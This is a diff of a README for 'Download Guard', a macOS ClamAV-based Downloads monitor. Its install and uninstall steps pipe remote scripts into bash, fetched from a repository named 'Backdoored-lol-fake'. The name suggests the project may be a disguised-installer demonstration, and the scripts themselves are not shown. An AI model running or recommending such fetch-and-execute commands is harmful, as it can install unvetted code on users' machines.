@@ -1,38 +1,36 @@
 # Download Guard for macOS
 
-A local Downloads monitor for macOS. It scans files already in `~/Downloads` the first time it starts, then scans only new or changed files. Detections are moved into a private quarantine folder; files are not permanently deleted.
+Download Guard is a clickable macOS app with a background Downloads monitor. It scans files locally with ClamAV and moves detections into quarantine rather than permanently deleting them.
 
 ## Install
 
-Requires macOS. If Homebrew is missing, the installer asks before running Homebrew's official installer. You can decline and install it yourself from https://brew.sh.
+Open Terminal and run:
 
 ```bash
 curl -fsSL https://raw.githubusercontent.com/ttmeticks-source/Backdoored-lol-fake/main/install.sh | bash
 ```
 
-The installer installs ClamAV, downloads its malware signatures, and registers a per-user LaunchAgent so the monitor starts when you log in.
+If Homebrew is missing, the installer asks before using Homebrew's official installer. It installs ClamAV, updates signatures, registers the background monitor, and creates **`~/Applications/Download Guard.app`**. Open it from your Applications folder like a normal Mac app. The monitor also starts automatically when you log in.
 
-## Scan behavior
+## Scanning
 
-- **First launch:** scans files already present in Downloads, waiting for files to stop changing.
-- **Later launches:** uses a saved local scan history and skips files whose size and modification time have not changed.
-- **New or changed files:** scanned automatically.
-- Scan errors are not treated as clean results; affected files are left untouched and retried.
-- Detected files are moved to `~/Library/Application Support/DownloadGuard/Quarantine`.
-- The macOS alert text says “Deleted 1 malware!”, but the file is actually quarantined so it can be reviewed or restored if it was a false positive.
-- Files are scanned locally; they are not uploaded by this tool.
+- First start: scans files already in `~/Downloads`.
+- Later: skips unchanged files using local scan history; new or changed files are scanned.
+- Files are scanned locally and are not uploaded by this app.
+- Scan errors are not treated as clean results; affected files remain untouched and are retried.
+- Detections move to `~/Library/Application Support/DownloadGuard/Quarantine`.
+- The notification text says “Deleted 1 malware!”, but the file is quarantined, not permanently erased.
 
-No antivirus can guarantee detection of every threat. Keep macOS and ClamAV signatures updated.
+## Locations
 
-## Logs and quarantine
-
+- App: `~/Applications/Download Guard.app`
 - Logs: `~/Library/Application Support/DownloadGuard/Logs`
 - Quarantine: `~/Library/Application Support/DownloadGuard/Quarantine`
+
+No antivirus can guarantee detection of every threat. Keep macOS and ClamAV signatures updated.
 
 ## Uninstall
 
 ```bash
 curl -fsSL https://raw.githubusercontent.com/ttmeticks-source/Backdoored-lol-fake/main/uninstall.sh | bash
 ```
-
-Uninstall removes the LaunchAgent and app files. Quarantined files and logs are retained for review.
